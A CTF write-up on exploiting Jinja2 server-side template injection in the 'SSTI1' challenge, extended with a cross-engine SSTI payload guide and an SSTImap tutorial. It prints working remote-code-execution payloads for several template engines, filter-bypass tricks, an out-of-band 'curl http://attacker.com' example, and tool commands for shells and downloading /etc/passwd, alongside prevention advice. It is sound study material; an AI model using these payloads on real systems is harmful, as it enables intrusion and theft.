# SSTI1 — CTF Writeup

| Field | Details |
| :--- | :--- |
| **Challenge** | SSTI1 |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Vulnerability** | Server-Side Template Injection (SSTI) |

---

## Initial Clue

The challenge description mentioned **templating** and provided an announcement submission form where user input was displayed back in the response. That raised the fundamental security question:

```text
Is my input being treated as normal data?
                OR
Is my input being interpreted as template code?
```

---

## Enumeration

**1. Submit Normal Input:**
Submitted `hello` — it was reflected back on the `/announce` page, confirming that user input reached the application and appeared in the HTTP response.

**2. Inspect HTTP Request / Response:**
Using browser DevTools (`Network` tab):
```http
POST /  →  307 Temporary Redirect  →  Location: /announce
```

A `307 Temporary Redirect` means the resource is temporarily located at another URL (specified in the `Location` response header). This is standard routing behavior, but important context during enumeration.

**3. Test for Template Evaluation:**
Given the "templating" hint and reflected input, we submitted a basic Jinja2 arithmetic expression:

```text
Input:               {{7*7}}
Expected (safe):     {{7*7}}
Actual (vulnerable): 49
```

Receiving `49` proved that the server was **evaluating** the input rather than treating it as static text.
→ **SSTI confirmed**, template engine identified as **Jinja2** (Python).

---

## Exploit

Once SSTI was confirmed, the goal was to traverse from a Jinja2 template object → an underlying Python object → the `os` module → arbitrary command execution.

**Final Payload:**
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
```

### Breaking the Chain Down:

| Step | Piece | What it does |
| :--- | :--- | :--- |
| **1** | `self` | Entry point — refers to the current template reference object |
| **2** | `._TemplateReference__context` | Reaches the internal rendering context of the template |
| **3** | `.cycler` | A Jinja2 helper object — used as a stepping stone to a Python object |
| **4** | `.__init__` | Accesses the object's constructor — a plain Python **function object** |
| **5** | `.__globals__` | References the function's module global namespace dictionary |
| **6** | `.os` | Accesses the `os` module imported in that namespace — bridge into the OS |
| **7** | `.popen('ls')` | Executes the shell command `ls`, returning an I/O pipe to stdout |
| **8** | `.read()` | Reads the command output back into the template response |

> [!NOTE]
> The exact object path (`cycler` here) is not the crucial takeaway. What matters is the general technique: find *any* Python object reachable from the template context → traverse to `__init__.__globals__` → land in a module namespace → access `os` (or an equivalent execution primitive) → execute commands. Different environments expose different objects, so this chain is adapted, not memorized.

**Flag Retrieval:**
```bash
ls          # Enumerate directory contents to locate flag file
cat flag    # Read the flag once located
```

---

## Tools

- Browser DevTools (`Network` tab)
- Jinja2 / Python runtime knowledge
- Linux terminal (`ls`, `cat`)

---

## What I Learned

### Web Fundamentals
- How user input flows from browser → server processing → HTTP response.
- What `POST`, `307 Temporary Redirect`, and the `Location` header represent.
- Why *reflected input* serves as a primary signal during vulnerability discovery.
- How to use browser DevTools to inspect raw HTTP requests and response headers.

### Server-Side Template Injection (SSTI)
- SSTI is a vulnerability *class*, not tied to a single template engine.
- `{{7*7}}` returning `49` is the classic probe for Jinja2/Twig-style engines.
- Exploit severity depends heavily on what objects are exposed in the template context.

### Jinja2 / Python Introspection
- Template delimiters: `{{ }}` for expressions, `{% %}` for statements, `{# #}` for comments.
- Any Python object can expose additional objects through attributes and methods.
- Function objects carry `__globals__`, exposing their parent module's namespace.
- `os.popen(cmd).read()` executes system commands and captures standard output.

### Core Methodology
```text
Find User Input ──> Trace Flow ──> Test Template Evaluation
──> Confirm SSTI ──> Identify Engine ──> Learn Syntax & Context
──> Traverse Objects ──> Reach Language Runtime ──> Reach OS / Shell
──> Complete Objective
```

---

## Why the Vulnerability Existed

The application allowed untrusted attacker input to become part of the **template source** that Jinja2 compiles and executes, instead of passing user input strictly as a **template variable**.

```text
Unsafe:  Template Source + User Input  →  Jinja2 evaluates user input as code
Safe:    Template + {{ user_input }}   →  Jinja2 renders user input as inert data
```

In Flask/Jinja2 terms:
```python
# Vulnerable — user input becomes executable template source
return render_template_string(user_input)

# Safe — user input is passed as a data variable, never executed as source
return render_template("page.html", announcement=user_input)
```

---

## How to Prevent It

1. **Never construct templates from untrusted input:** Do not concatenate or format user input directly into template strings.
2. **Pass user input only as rendering variables:** Avoid `render_template_string()` or dynamic compilation containing unvalidated user input.
3. **Use framework-standard rendering APIs:** Use `render_template()` with static template files.
4. **Sandbox / restrict the template environment:** If dynamic templating is unavoidable, restrict Python built-ins, `os`, `subprocess`, and sensitive globals.
5. **Do not rely on blocklists:** Blocking specific strings like `{{7*7}}` or `os` is ineffective because alternative encodings and traversal chains exist.
6. **Maintain strict code/data separation:** The template is executable code; user input is passive data. The two must never be merged.

---

# 📘 Additional Material — General Guide to Finding & Exploiting SSTI

*This section is engine-agnostic. Use it whenever you encounter a target and need to determine whether it is Jinja2, Twig, FreeMarker, or another engine.*

---

## 1. How to Detect SSTI

Locate any input field reflected in a rendered page (names, comments, search boxes, error messages, report generators, email templates, preview handlers) and test with a **polyglot probe**:

```text
${7*7}
${{7*7}}
{{7*7}}
{{7*'7'}}
#{7*7}
<%= 7*7 %>
{{7*7}}[[5*5]]
${{<%[%'"}}%\.
```

### Interpreting Probe Results:

* **`49`** — Numeric expression evaluated → **SSTI confirmed**.
* **`7777777`** — Evaluated string multiplication (`7 * '7'`) → strongly indicates **Python engines (Jinja2 / Mako)**.
* **Literal payload reflected unchanged** — Likely not vulnerable (or properly encoded).
* **Error message / Stack trace** — Often directly leaks the **engine name and version**.
* **Blank page / 500 error** — Possible crash from unsupported syntax; test engine-specific syntax next.

> [!TIP]
> **Always inspect error pages.** Template engines frequently produce verbose stack traces upon encountering syntax errors, exposing names like `jinja2.exceptions`, `Twig_Error`, or `freemarker.core`.

---

## 2. Fingerprinting the Engine

Once SSTI is detected, identify the specific engine using syntax probes:

| Engine | Language | Detection Payload | Notes |
| :--- | :--- | :--- | :--- |
| **Jinja2** | Python | `{{7*7}}` → `49` | Common in Flask & Django projects |
| **Mako** | Python | `${7*7}` → `49` | Python templating engine |
| **Twig** | PHP | `{{7*'7'}}` → `49` | String coerced to integer; common in Symfony |
| **Smarty** | PHP | `{7*7}` → `49` | PHP templating engine |
| **FreeMarker**| Java | `<#assign x=7*7>${x}` → `49` | Common in Spring Boot & Java apps |
| **Velocity** | Java | `#set($x=7*7)$x` → `49` | Java templating engine |
| **ERB** | Ruby | `<%= 7*7 %>` → `49` | Standard in Ruby on Rails |
| **Pug** | Node.js | `#{7*7}` → `49` | Node.js Express template engine |
| **EJS** | Node.js | `<%= 7*7 %>` → `49` | JavaScript templating |

The **string multiplication test** (`7*'7'`) is the standard differentiator: Python-based engines (Jinja2, Mako) output `'7777777'`, while most other engines return `49` or raise an error.

---

## 3. General Exploitation Strategy

Across all engines, the escalation path follows the same progression:

```text
Template Expression Evaluation
              ↓
Objects Exposed by Template Context
              ↓
Objects & Methods of the Underlying Runtime Language
              ↓
Operating System / Process Interface
              ↓
Arbitrary Command Execution (RCE)
```

### General Methodology:
1. Confirm the underlying runtime language (Python, Java, PHP, Ruby, Node.js).
2. Leverage language-specific introspection (`__globals__` in Python, `Runtime.getRuntime()` in Java, `system()` in PHP, `child_process` in Node).
3. Traverse reachable template objects until landing in an execution primitive.
4. If sandboxed, research documented sandbox escapes for that specific engine and version.

---

### Common Payload Families by Language

#### Jinja2 (Python)
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<index of subprocess.Popen>]('id',shell=True,stdout=-1).communicate() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.items() }}
```

*(The `__subclasses__()` technique works because all Python classes inherit from `object`, allowing traversal to `subprocess.Popen` even when `os` is not directly imported).*

#### Twig (PHP)
```twig
{{ ['id'] | filter('system') }}
{{ ['id', '', ['/bin/sh', '-c']] | reduce('exec') }}
```

#### FreeMarker (Java)
```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### Ruby ERB
```erb
<%= system('id') %>
<%= `id` %>
```

#### Pug / EJS (Node.js)
```javascript
#{root.process.mainModule.require('child_process').execSync('id')}
```

---

## 4. Handling Edge Cases

- **Blind SSTI (No reflected output):** Trigger out-of-band (OOB) interactions via DNS or HTTP requests (e.g. `os.popen('curl http://attacker.com')`) and monitor listener logs.
- **WAF / Character Filtering:** Bypass dot filters using dictionary lookups (`|attr('__class__')`), character concatenation (`('__cla'+'ss__')`), or hex/Unicode encoding.
- **Sandboxed Environments:** If `SandboxedEnvironment` is enabled, look up known CVEs and gadget chains tailored to the specific library version.

---

## 5. Useful Automation & References

- **[tplmap](https://github.com/epinna/tplmap):** Automated SSTI scanner and exploitation tool.
- **[PayloadsAllTheThings – SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection):** Comprehensive community-maintained payload database.
- **[HackTricks – SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html):** In-depth detection cheat sheets and escape techniques.

---

# 🎯 How to Actually Master SSTI

Solving a challenge with a pre-made payload is a good first step, but developing true proficiency requires understanding *why* the payloads work:

1. **Master Python's Object Model:**
   SSTI on Jinja2 is Python introspection abuse. Practice with `__class__`, `__mro__`, `__subclasses__()`, `__init__`, `__globals__`, and `__builtins__` in a standalone Python REPL until the mechanics become second nature.
2. **Build a Vulnerable Flask Application:**
   Write a 10-line Flask route using `render_template_string(request.args.get('name'))`, run it locally, and exploit your own code. Building the vulnerability solidifies understanding.
3. **Experiment with a Non-Python Engine:**
   Create a small Node/EJS or PHP/Twig app and repeat the exercise. This reinforces SSTI as an architectural vulnerability class rather than a Python-specific quirk.
4. **Complete Structured Labs:**
   - [PortSwigger Web Security Academy – SSTI](https://portswigger.net/web-security/server-side-template-injection) (Free, guided labs with explanations).
   - HackTricks SSTI documentation as a field reference.
   - PicoCTF, TryHackMe, and Hack The Box web tracks.
5. **Re-solve Challenges From Scratch:**
   Attempt to re-solve SSTI1 from memory without consulting notes. If you can identify the engine, traverse the object hierarchy, and execute commands independently, the concept is mastered.
6. **Study Real-World Vulnerability Disclosures:**
   Review disclosed HackerOne bug bounty reports and CVE advisories to observe how SSTI manifests in complex production systems.

---

# 🤖 Additional Material — SSTImap Detection & Exploitation Guide

*SSTImap is an automated tool for testing and exploiting Server-Side Template Injection vulnerabilities.*

## What is SSTImap?

SSTImap is an automated command-line tool based on Tplmap. It supports multiple template engines and programming languages to automate:
- SSTI detection
- Template engine identification
- Injection-point analysis
- Template code evaluation
- Arbitrary operating system command execution
- Remote file upload, download, and inspection
- Interactive bind and reverse shells

---

## Installation

**1. Clone the Repository:**
```bash
cd ~/git_projects
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
```

**2. Verify Python Version:**
```bash
python3 --version
```

**3. Configure Virtual Environment (PEP 668):**
Kali Linux enforces PEP 668 to protect system packages. Set up a virtual environment:
```bash
sudo apt update
sudo apt install python3-venv python3-full -y
python3 -m venv venv
source venv/bin/activate
```

**4. Install Dependencies:**
```bash
pip install -r requirements.txt
python3 sstimap.py -h
```

---

## Basic Usage

Basic command syntax:
```bash
python3 sstimap.py -u "TARGET_URL"
```

### GET Parameters
If the injection point is in a URL parameter:
```bash
python3 sstimap.py -u "http://example.com/?name=hello"
```

### POST Parameters
If data is submitted in a POST body, supply the payload with `-d`:
```bash
python3 sstimap.py -u "http://example.com/" -d "content=hello"
```

For SSTI1, the vulnerable parameter was `content`:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello"
```

---

## Finding the Correct Parameter

If SSTImap reports:
> *Tested parameters appear to be not injectable.*

Do not immediately assume the endpoint is safe. Use browser DevTools to verify request details:
`Browser → Developer Tools → Network → Submit Form → Inspect Headers & Form Data`

Ensure the HTTP method, parameter names, and Content-Type sent by SSTImap match what the application expects.

---

## Manual SSTI Confirmation

Always understand the underlying manual probe before running automated tools. For Jinja2:
```text
{{7*7}} ──> Template Engine Evaluates ──> 49
```
If `49` appears in the response, template injection is confirmed.

---

## Detecting the Template Engine

SSTImap tests multiple engines sequentially (`Velocity`, `OGNL`, `FreeMarker`, `Twig`, `Nunjucks`, `Jinja2`, etc.).

### Specifying a Known Engine
When the engine is already known, target it directly using `--engine` to accelerate testing and minimize extraneous traffic:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello" --engine python/jinja2
```

---

## Understanding SSTImap Results

A successful scan outputs detection metadata:
```text
[+] Jinja2 plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: content
  Engine: Jinja2
  Injection: *
  Context: text
  OS: posix-linux
  Technique: rendered
```

- **Body parameter (`content`):** The vulnerable parameter in the HTTP body.
- **Engine (`Jinja2`):** Identified template framework.
- **Context (`text`):** Input is evaluated in a text/template context.
- **OS (`posix-linux`):** Target operating system.
- **Technique (`rendered`):** Injection confirmed through reflected output changes.

### Capabilities Matrix:
```text
Capabilities:
  Shell command execution: ok
  Bind and reverse shell: ok
  File write: ok
  File read: ok
  Code evaluation: ok, python code
```

---

## Interactive Mode

Launch an interactive session with `--interactive`:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello" --engine python/jinja2 --interactive
```

Inside the interactive prompt (`SSTImap (TARGET)>`), use `help` to list commands.

### Key Interactive Commands:
| Command | Description |
| :--- | :--- |
| `opt` | Display current configuration (URL, POST body, Engine, etc.) |
| `info` | Display detection findings and capabilities |
| `run` / `test` | Run detection scan |
| `engine python/jinja2` | Set target template engine |
| `data content=hello` | Set POST request body |
| `os_cmd COMMAND` | Execute single OS command |
| `os` / `os_shell` | Spawn interactive OS shell |
| `tpl` / `tpl_shell` | Spawn interactive template-engine shell |
| `eval` / `eval_shell` | Spawn Python code evaluation shell |
| `download REMOTE LOCAL` | Download file from target |
| `upload LOCAL REMOTE` | Upload file to target |

---

## Exploitation Commands

### OS Command Execution
- **Command-Line Mode:**
  ```bash
  python3 sstimap.py -u "http://TARGET/" -d "content=hello" --os-cmd
  ```
- **Interactive Mode:**
  ```text
  os_cmd ls -la
  os_cmd cat flag
  ```

### File Transfer
- **Download:** `download /etc/passwd ./passwd.txt`
- **Upload:** `upload ./shell.sh /tmp/shell.sh`

---

## Injection Points & Configuration

SSTImap tests multiple input locations:
- **`Q`** — Query parameters
- **`B`** — Body parameters
- **`H`** — Headers (`header X-Test: hello`)
- **`C`** — Cookies (`cookie session=VALUE`)
- **Method:** `method POST` or `method GET`

### Proxy Integration
SSTImap traffic can be routed through an interception proxy (e.g. Burp Suite) using `--proxy http://127.0.0.1:8080` to inspect outgoing payloads.

---

## Detection Techniques

SSTImap supports four detection mechanisms (default: `REBT`):
- **`R` (Rendered):** Detects evaluated expressions directly in output (used in SSTI1).
- **`E` (Error-Based):** Analyzes server error messages triggered by invalid syntax.
- **`B` (Boolean Blind):** Compares response behavior between TRUE and FALSE expressions.
- **`T` (Time-Based Blind):** Measures timing differences from injected sleep operations.

---

## SSTI1 Interactive Workflow Example

```text
1. Launch:       python3 sstimap.py -u "http://TARGET/" -d "content=hello" --engine python/jinja2 --interactive
2. Check Config: opt
3. Scan:         run
4. Inspect:      info
5. Execute:      os_cmd ls
6. Read Flag:    os_cmd cat flag
```

---

## Common Mistakes & Troubleshooting

1. **Running `--os-cmd` as a Standalone Command:** `--os-cmd` is a CLI argument for `sstimap.py`, not an independent Bash binary. In interactive mode, use `os_cmd <command>`.
2. **Literal Placeholders:** Do not type literal placeholder strings like `download REMOTE LOCAL`. Provide actual file paths (e.g. `download /tmp/test.txt ./test.txt`).
3. **Assuming Failed Scans Mean Safe Targets:** Verify that request parameters, HTTP headers, and URL encoding match application expectations.
4. **Testing All Engines Unnecessarily:** If the stack is known to be Flask/Python, use `--engine python/jinja2` to avoid redundant requests.
5. **Connection Aborts / Timeouts:** Temporary network errors or target rate-limiting may interrupt scans. Verify target availability before retrying.
6. **Instance Expiration:** PicoCTF challenge instances have time limits. If the host or port changes, update the target URL in SSTImap accordingly.

---

## Recommended SSTI Workflow

```text
1. Locate User Input Fields
2. Submit Baseline Input & Observe Reflection
3. Inspect Raw HTTP Request & Response
4. Test Simple Template Expressions ({{7*7}})
5. Confirm Evaluation & Identify Template Engine
6. Leverage SSTImap for Rapid Enumeration
7. Constrain Scan to Known Engine (--engine)
8. Verify Execution Capabilities
9. Apply Least Privilege Command Execution
10. Retrieve Objective / Flag
```

> [!IMPORTANT]
> **Authorization Notice:** Only execute SSTImap and automated exploitation tools against systems you have explicit written authorization to test, such as dedicated CTF challenges and local lab environments.
